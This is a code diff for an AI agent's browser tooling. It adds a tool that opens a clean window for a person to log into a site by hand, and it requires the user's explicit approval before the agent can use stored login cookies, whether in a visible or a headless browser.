+_LOGIN_WINDOW_TIMEOUT_SEC = 300
+_LOGIN_WINDOW_POLL_SEC = 2.0
+
+# Login windows in flight, one per agent. Separate from the interactive and
+# fetch registries because no `browser_*` tool may drive this window: the
+# human is typing a password into it.
+_login_windows: dict[str, "AuthBrowser"] = {}
+
+
+def get_login_windows() -> dict[str, "AuthBrowser"]:
+    """The live dict. Read by `browse_page` to refuse spending a jar whose
+    login is still being typed, and by tests."""
+    return _login_windows
+
+
+def _no_approved_login_message(domain: str, etld1: str, approved: list[str]) -> str:
+    known = ", ".join(sorted(approved)) or "none yet"
+    return (
+        f"⚠️ No approved login for '{domain}' (registrable domain "
+        f"'{etld1}'). Stored cookies alone are not approval — a browser "
+        f"writes those itself. Approved logins: {known}.\n"
+        f"Call open_login_window(domain=\"{etld1}\") — a clean window opens "
+        f"with none of your saved logins in it, you type the password there, "
+        f"and when it is finished the user is asked in the UI to confirm the "
+        f"login. A login recorded before 2026-09-11 does not count and has "
+        f"to be done once more; after that every subdomain spelling of "
+        f"'{etld1}' is covered."
+    )
+
+
+def _login_not_approved_message(
+    etld1: str, outcome: str, timed_out: bool, window_timeout_sec: int,
+) -> str:
+    """Why no approval was recorded, in the words of what actually happened.
+
+    A refusal, an unanswered question and an absent UI are three different
+    events; collapsing them tells the agent to retry when it cannot work,
+    or to give up when one click would have fixed it."""
+    window = (
+        f"The window stayed open for the whole {window_timeout_sec}s "
+        f"and was closed for you. "
+        if timed_out else ""
+    )
+    if outcome == APPROVAL_NO_UI:
+        tail = (
+            "no UI client was connected to ask, so nobody approved it. The "
+            "cookies were saved but cannot be used. Open D-PC Messenger and "
+            "run open_login_window again."
+        )
+    elif outcome == APPROVAL_TIMEOUT:
+        tail = (
+            f"the confirmation was not answered within "
+            f"{_LOGIN_APPROVAL_TIMEOUT_SEC}s. Silence is not a yes, so no "
+            f"approval was recorded. Run open_login_window again."
+        )
+    else:
+        tail = (
+            "the user declined the confirmation. No approval was recorded."
+        )
+    return (
+        f"⚠️ No approved login for {etld1}: {window}{tail}"
+    )
+
+
+async def open_login_window(
+    ctx: ToolContext,
+    domain: str,
+    timeout_sec: int = _LOGIN_WINDOW_TIMEOUT_SEC,
+) -> str:
+    """Open a headed browser for the human to log into `domain` by hand.
+
+    The window starts with nothing to steal: no `storage_state`, no vault
+    cookies. Cookies appearing in it are saved to `domain`'s jar as data.
+
+    The approval is a separate act: when the window is finished the person
+    is asked in the UI whether they logged in, and only their yes writes the
+    `approved` block `browse_page(use_auth=...)` requires. Cookies prove
+    nothing — a site hands guest cookies to any anonymous visitor.
+    """
+    agent_id = ctx.agent_root.name
+    from dpc_client_core import web_auth as _wa
+
+    etld1 = _wa.resolve_etld1(domain)
+    if etld1 is None:
+        _wa.audit_append(
+            agent_id, domain, "", status="login_window_denied:not_a_domain",
+        )
+        return (
+            f"⚠️ '{domain}' is not a registrable domain — it is a public "
+            f"suffix, an address, or a bare name. A login cannot be scoped "
+            f"to it. Pass the site itself, e.g. 'example.com'."
+        )
+
+    url = f"https://{etld1}/"
+    dpc_service = getattr(ctx, "dpc_service", None)
+    local_api = getattr(dpc_service, "local_api", None) if dpc_service else None
+    if local_api is None or not getattr(local_api, "has_clients", True):
+        # A window nobody is looking at cannot collect a password, and
+        # opening one would leave a headed browser on an unattended screen.
+        # `local_api is None` is the same fact arriving differently — no
+        # service on the context at all — and it used to skip the check
+        # rather than trip it, so the certainty that nobody was watching
+        # was the one case that opened a window.
+        _wa.audit_append(agent_id, etld1, url, status="login_window_denied:headless_no_ui")
+        return (
+            f"⚠️ A login window for '{etld1}' needs a person at the screen, "
+            f"and no UI client is connected. Ask the user to open D-PC "
+            f"Messenger, then call this again."
+        )
+
+    if _login_windows.get(agent_id) is not None:
+        return (
+            "⚠️ A login window is already open for this agent. Finish or "
+            "close it before opening another."
+        )
+
+    timeout_sec = max(30, min(int(timeout_sec), 1800))
+    session = AuthBrowser(
+        agent_id=agent_id, domains=[etld1], headed=True, login_window=True,
+    )
+    _login_windows[agent_id] = session
+    try:
+        try:
+            await _run_in_session(session, "start")
+            await _run_in_session(session, "navigate", url)
+        except ImportError:
+            _wa.audit_append(agent_id, etld1, url, status="camoufox_missing")
+            return (
+                "⚠️ Camoufox browser is not installed. Run "
+                "`uv sync --extra browser` in dpc-client/core to enable."
+            )
+        except (RuntimeError, OSError, asyncio.TimeoutError) as e:
+            _wa.audit_append(agent_id, etld1, url, status="login_window_error")
+            return f"⚠️ Could not open a login window for {etld1}: {e}"
+
+        _wa.audit_append(agent_id, etld1, url, status="login_window_opened")
+
+        deadline = time.monotonic() + timeout_sec
+        timed_out = True
+        while time.monotonic() < deadline:
+            await asyncio.sleep(_LOGIN_WINDOW_POLL_SEC)
+            try:
+                await _run_in_session(
+                    session, "capture_login_cookies",
+                    _touch=False, _timeout=WINDOW_PROBE_TIMEOUT_SECONDS,
+                )
+                gone = await _run_in_session(
+                    session, "window_is_gone",
+                    _touch=False, _timeout=WINDOW_PROBE_TIMEOUT_SECONDS,
+                )
+            except Exception as e:
+                # A browser that will not answer is not a closed window;
+                # keep waiting for the human rather than tearing it down.
+                log.debug("login window probe failed (agent=%s): %s", agent_id, e)
+                continue
+            if gone:
+                timed_out = False
+                break
+        evidence: dict = {}
+        try:
+            evidence = session.login_cookie_evidence()
+        except Exception as e:  # never lose the window over its own summary
+            log.debug("login window evidence failed (agent=%s): %s", agent_id, e)
+    finally:
+        try:
+            await _run_in_session(session, "close", _touch=False)
+        except Exception as e:
+            log.debug("login window close failed (agent=%s): %s", agent_id, e)
+        _login_windows.pop(agent_id, None)
+
+    # What THIS window wrote, not what the jar happens to hold: an older jar
+    # for the same site would otherwise make an empty window look successful.
+    if not evidence.get("written"):
+        _wa.audit_append(agent_id, etld1, url, status="login_window_no_cookies")
+        reason = (
+            f"the window was still open after {timeout_sec}s and was closed"
+            if timed_out else "the window was closed"
+        )
+        return (
+            f"⚠️ No login was captured for {etld1}: {reason} without any "
+            f"cookies for that site appearing. Nothing was saved and nobody "
+            f"was asked to approve anything. Call open_login_window again "
+            f"and complete the sign-in."
+        )
+
+    # The window is finished and a jar exists. Whether the person actually
+    # logged in is not something the jar can answer — guest cookies look
+    # like this too — so it is asked, and the diff below travels as context
+    # for the person, not as a reason to skip asking anyone.
+    _wa.log_browser_action(
+        agent_id, etld1, "login_approval_requested", url, result="ok",
+        closed_by="timeout" if timed_out else "human",
+        baseline_cookies=evidence.get("baseline_count"),
+        cookies_now=evidence.get("now_count"),
+        new_cookie_names=evidence.get("new_cookie_names"),
+    )
+    _origin_id, _origin_title = conversation_origin(ctx)
+    outcome = await _ask_human_to_approve(
+        local_api,
+        kind=APPROVAL_KIND_LOGIN,
+        agent_id=agent_id,
+        agent_name=agent_display_name(ctx),
+        domain=etld1,
+        url=url,
+        conversation_id=_origin_id,
+        conversation_title=_origin_title,
+        question=(
+            f"Did you finish signing in to {etld1}? Approving lets this "
+            f"agent spend that login later."
+        ),
+        evidence=evidence,
+        timeout_sec=_LOGIN_APPROVAL_TIMEOUT_SEC,
+    )
+    _wa.log_browser_action(
+        agent_id, etld1, "login_approval_answer", url, result=outcome,
+    )
+
+    if outcome != APPROVAL_APPROVED:
+        _wa.audit_append(
+            agent_id, etld1, url, status=f"login_window_{outcome}",
+        )
+        return _login_not_approved_message(
+            etld1, outcome, timed_out, timeout_sec,
+        )
+
+    approval = _wa.record_approval(
+        agent_id, etld1, via=_wa.APPROVAL_VIA_LOGIN_WINDOW,
+    )
+    if approval is None:
+        _wa.audit_append(agent_id, etld1, url, status="login_window_no_jar")
+        return (
+            f"⚠️ You approved the login for {etld1}, but there is no cookie "
+            f"jar to attach it to — the sign-in landed on a different site. "
+            f"Nothing was recorded."
+        )
+    _wa.log_browser_action(
+        agent_id, etld1, "login_approved", url, result="ok",
+        via=approval.get("via"), at=approval.get("at"),
+    )
+    _wa.audit_append(agent_id, etld1, url, status="login_window_approved")
+    return (
+        f"Login for {etld1} approved at {approval.get('at')} "
+        f"(via {approval.get('via')}). browse_page(use_auth=\"{etld1}\") "
+        f"now works, headed or headless."
+    )
+
+
 def _domain_of(url: str) -> str:
     """Host part of a URL, for the audit row. Never raises."""
     try:
@@ -2896,58 +3646,83 @@ async def browse_page(
         # must move to a helper there — track via grep on `agent_root.name`.
         agent_id = ctx.agent_root.name
 
-        # ADR-028 T5 (:179): reject a `use_auth` domain outside the agent's
-        # web_auth.allowed_domains, before Camoufox opens. `firewall is None`
-        # is the pure-unit-test context and skips the gate by design — so a
-        # wiring mistake that leaves `dpc_service` unset skips it too.
+        # A recorded human approval is the authorisation — not the presence
+        # of a cookie jar, which the browser's own navigate/close writeback
+        # creates. Headed is not exempt: `keep_open=True` spends the stored
+        # login exactly as headless does, and the window being visible does
+        # not make the account's owner the one who chose to spend it. A new
+        # login is a different act with a different tool, open_login_window.
         #
         # ADR-028:179 names `fetch_json` as well; it has no `use_auth` today.
         # If it gains one, hoist this into a helper both call rather than
         # copying it — a second copy of an access check is how one ends up a
-        # version behind. The empty-vault case is deliberately not decided
-        # here; see THE-EMPTY-VAULT-CASE-HAS-TWO-TESTS-ASSERTING-OPPOSITE-THINGS.
-        firewall = None
+        # version behind.
         dpc_service = getattr(ctx, "dpc_service", None)
-        if dpc_service is not None:
-            firewall = getattr(dpc_service, "firewall", None)
         from dpc_client_core import web_auth as _web_auth_mod
 
-        # Both sides go through `resolve_etld1`, which is the vault's own key —
-        # so no subdomain spelling reads another domain's cookies. What it is
-        # NOT is a public-suffix resolver: `ETLD1_MAP` holds 12 hardcoded test
-        # hostnames and passes everything else through unchanged, so for a real
-        # site `example.com` does not cover `www.example.com` and each spelling
-        # must be listed. The refusal below says so; the fix is a PSL.
+        # `resolve_etld1` is the vault's own key and a real Public Suffix
+        # List resolver, so every subdomain spelling of a site lands on the
+        # one jar and no spelling reaches another site's. None means the
+        # input names no registrable domain at all.
         _requested_etld1 = _web_auth_mod.resolve_etld1(use_auth)
-        if firewall is not None:
-            _allowed = {
-                _web_auth_mod.resolve_etld1(d)
-                for d in firewall.get_agent_web_auth_domains(agent_id)
-            }
-            if not _requested_etld1 or _requested_etld1 not in _allowed:
-                _web_auth_mod.audit_append(
-                    agent_id, use_auth, url,
-                    status="firewall_denied:not_in_whitelist",
-                )
-                return (
-                    f"⚠️ '{use_auth}' is not in this agent's authorised web-auth "
-                    f"domains. Add **this exact hostname** to privacy_rules.json "
-                    f"→ agent_profiles.{agent_id}.web_auth.allowed_domains, then "
-                    f"log in via the web-auth UI. Subdomains are not covered by "
-                    f"their parent domain: 'www.{_requested_etld1 or use_auth}' "
-                    f"and '{_requested_etld1 or use_auth}' are separate entries."
-                )
+        if _requested_etld1 is None:
+            _web_auth_mod.audit_append(
+                agent_id, use_auth, url, status="auth_denied:not_a_domain",
+            )
+            return (
+                f"⚠️ '{use_auth}' is not a registrable domain — it is a public "
+                f"suffix, an address, or a bare name. Cookies cannot be scoped "
+                f"to it (a jar for 'com' would be one jar for every .com site), "
+                f"so pass the site itself, e.g. 'example.com'."
+            )
+        # A login for this site may be half finished right now. The window
+        # polls its cookies into the jar as they appear, so between the
+        # first page and the person's answer the jar holds the *new*
+        # session under the *previous* approval — and the login window is
+        # a registry of its own, so nothing here would have noticed.
+        _window = get_login_windows().get(agent_id)
+        if _window is not None and _requested_etld1 in getattr(
+            _window, "_etld1s", frozenset()
+        ):
+            _web_auth_mod.audit_append(
+                agent_id, use_auth, url, status="auth_denied:login_in_progress",
+            )
+            return (
+                f"⚠️ A login window for '{_requested_etld1}' is open right "
+                f"now. Its cookies are half written and nobody has approved "
+                f"them yet, so they cannot be spent. Wait for "
+                f"open_login_window to return and try again."
+            )
+
+        if not _web_auth_mod.is_approved(agent_id, _requested_etld1):
+            _web_auth_mod.audit_append(
+                agent_id, use_auth, url,
+                status="auth_denied:no_approved_login",
+            )
+            _approved = [
+                _resolved
+                for row in _web_auth_mod.list_domains(agent_id)
+                if row.get("approved")
+                and (_resolved := _web_auth_mod.resolve_etld1(row["domain"]))
+                is not None
+            ]
+            return _no_approved_login_message(
+                use_auth, _requested_etld1, _approved,
+            )
 
         # ADR-029 Task 008: per-request approval for headless auth.
         # Headed (keep_open=True) needs no gate — human sees the browser.
         # Headless (keep_open=False) broadcasts approval request to UI.
         if not keep_open:
             local_api = getattr(dpc_service, "local_api", None) if dpc_service else None
-            if local_api is not None and not getattr(local_api, "has_clients", True):
+            if local_api is None or not getattr(local_api, "has_clients", True):
                 # broadcast_event drops the request when nobody is connected,
                 # so the wait below could only ever time out. Two minutes of
                 # silence per call, and the agent is told "not approved" as
                 # though a human had refused. Say what actually happened.
+                # No service on the context is the same answer: there is no
+                # surface to ask through, and skipping the ask is not the
+                # same as being allowed to proceed without one.
                 _web_auth_mod.audit_append(
                     agent_id, use_auth, url, status="headless_no_ui",
                 )
@@ -2956,52 +3731,41 @@ async def browse_page(
                     f"UI client is connected to approve it. Use keep_open=true "
                     f"for a headed browser."
                 )
-            if local_api is not None:
-                import uuid as _uuid
-                approval_id = _uuid.uuid4().hex[:12]
-                approval_event = _CrossLoopSignal()
-                _pending_auth_approvals[approval_id] = {
-                    "event": approval_event,
-                    "agent_id": agent_id,
-                    "domain": use_auth,
-                    "url": url,
-                    "approved": False,
-                }
-                # This gate asked the least of the three: an agent id and no
-                # chat at all, so the person was told neither who was using
-                # their logged-in account nor from where.
-                _origin_id, _origin_title = conversation_origin(ctx)
-                await local_api.broadcast_event(
-                    "web_auth_headless_approval_request",
-                    {
-                        "request_id": approval_id,
-                        "agent_id": agent_id,
-                        "agent_name": agent_display_name(ctx),
-                        "domain": use_auth,
-                        "url": url,
-                        "conversation_id": _origin_id,
-                        "conversation_title": _origin_title,
-                    },
-                )
-                try:
-                    await asyncio.wait_for(
-                        approval_event.wait(),
-                        timeout=_HEADLESS_APPROVAL_TIMEOUT_SEC,
-                    )
-                except asyncio.TimeoutError:
-                    pass
-                entry = _pending_auth_approvals.pop(approval_id, {})
-                if not entry.get("approved", False):
-                    _web_auth_mod.audit_append(
-                        agent_id, use_auth, url, status="headless_rejected",
-                    )
-                    return (
-                        f"⚠️ Headless access to '{use_auth}' was not approved. "
-                        f"Use keep_open=true for headed browser login."
-                    )
+            # This gate asked the least of the three: an agent id and no
+            # chat at all, so the person was told neither who was using
+            # their logged-in account nor from where.
+            _origin_id, _origin_title = conversation_origin(ctx)
+            _web_auth_mod.audit_append(
+                agent_id, use_auth, url, status="headless_requested",
+            )
+            _outcome = await _ask_human_to_approve(
+                local_api,
+                kind=APPROVAL_KIND_HEADLESS_USE,
+                agent_id=agent_id,
+                agent_name=agent_display_name(ctx),
+                domain=_requested_etld1,
+                url=url,
+                conversation_id=_origin_id,
+                conversation_title=_origin_title,
+                question=(
+                    f"Let this agent use your saved {_requested_etld1} login "
+                    f"in a browser you will not see?"
+                ),
+                timeout_sec=_HEADLESS_APPROVAL_TIMEOUT_SEC,
+            )
+            if _outcome != APPROVAL_APPROVED:
                 _web_auth_mod.audit_append(
-                    agent_id, use_auth, url, status="headless_approved",
+                    agent_id, use_auth, url,
+                    status=f"headless_{_outcome}",
                 )
+                return (
+                    f"⚠️ Headless access to '{use_auth}' was not approved "
+                    f"({_outcome}). Use keep_open=true for headed browser "
+                    f"login."
+                )
+            _web_auth_mod.audit_append(
+                agent_id, use_auth, url, status="headless_approved",
+            )
 
         try:
             if keep_open:
@@ -3757,7 +4521,7 @@ def get_tools() -> List[ToolEntry]:
             name="browse_page",
             schema={
                 "name": "browse_page",
-                "description": f"Fetch a web page and extract content as structured markdown. Preserves headings, lists, tables, and links. Use size presets to control output length: s=5K, m=10K (default), l=25K, f=full. A tool result is cut again at {cap} chars before it reaches you, so for a long page pass save_to=<filename>: the whole markdown is written there and read_file(offset=, limit=) pages through it. Set use_auth=<domain> to fetch authenticated content using stored cookies (requires prior login via the web-auth UI). Set keep_open=true to leave the headed Camoufox window open after returning (works for both anonymous and use_auth fetches) — useful for visual debugging and Task 002 stateful interactive flows.",
+                "description": f"Fetch a web page and extract content as structured markdown. Preserves headings, lists, tables, and links. Use size presets to control output length: s=5K, m=10K (default), l=25K, f=full. A tool result is cut again at {cap} chars before it reaches you, so for a long page pass save_to=<filename>: the whole markdown is written there and read_file(offset=, limit=) pages through it. Set use_auth=<domain> to fetch authenticated content using stored cookies; this requires an approved login for that domain, recorded by open_login_window. Stored cookies on their own are not approval. Set keep_open=true to leave the headed Camoufox window open after returning (works for both anonymous and use_auth fetches) — useful for visual debugging and Task 002 stateful interactive flows.",
                 "parameters": {
                     "type": "object",
                     "properties": {
@@ -3804,6 +4568,59 @@ def get_tools() -> List[ToolEntry]:
             # Anonymous browse_page (without use_auth) returns in <10s so
             # the higher cap doesn't slow that path down.
             timeout_sec=360,
+            default_enabled=False,
+        ),
+
+        ToolEntry(
+            name="open_login_window",
+            schema={
+                "name": "open_login_window",
+                "description": (
+                    "Ask the human to log into a site by hand. Opens a headed "
+                    "browser window on that site with a clean profile — none of "
+                    "the agent's saved logins are loaded into it and no other "
+                    "site is reachable from it — so nothing can be taken from "
+                    "the window and the only cookies that can appear are the "
+                    "ones the person types in. Closing the window saves those "
+                    "cookies and records the approval that "
+                    "browse_page(use_auth=...) requires. Use this when "
+                    "browse_page says there is no approved login for a domain. "
+                    "Requires a connected UI client — a window nobody is "
+                    "looking at is refused. This call blocks until the person "
+                    "closes the window or the timeout elapses."
+                ),
+                "parameters": {
+                    "type": "object",
+                    "properties": {
+                        "domain": {
+                            "type": "string",
+                            "description": (
+                                "Site to log into, e.g. 'example.com'. Reduced "
+                                "to its registrable domain; the login then "
+                                "covers every subdomain spelling of it."
+                            ),
+                        },
+                        "timeout_sec": {
+                            "type": "integer",
+                            "description": (
+                                "How long to wait for the person to finish, "
+                                "30-1800 seconds. The window is closed when it "
+                                "elapses; anything already signed in by then is "
+                                "kept."
+                            ),
+                            "default": _LOGIN_WINDOW_TIMEOUT_SEC,
+                        },
+                    },
+                    "required": ["domain"],
+                },
+            },
+            handler=open_login_window,
+            # The call parks on the human for up to timeout_sec (max 1800),
+            # plus Camoufox launch and one navigate.
+            timeout_sec=1860,
+            # Opt-in. It puts a window on the user's screen asking for a
+            # password and is the one act that can create a web-auth
+            # approval — the two things S148 names as reasons to fail closed.
             default_enabled=False,
         ),
 
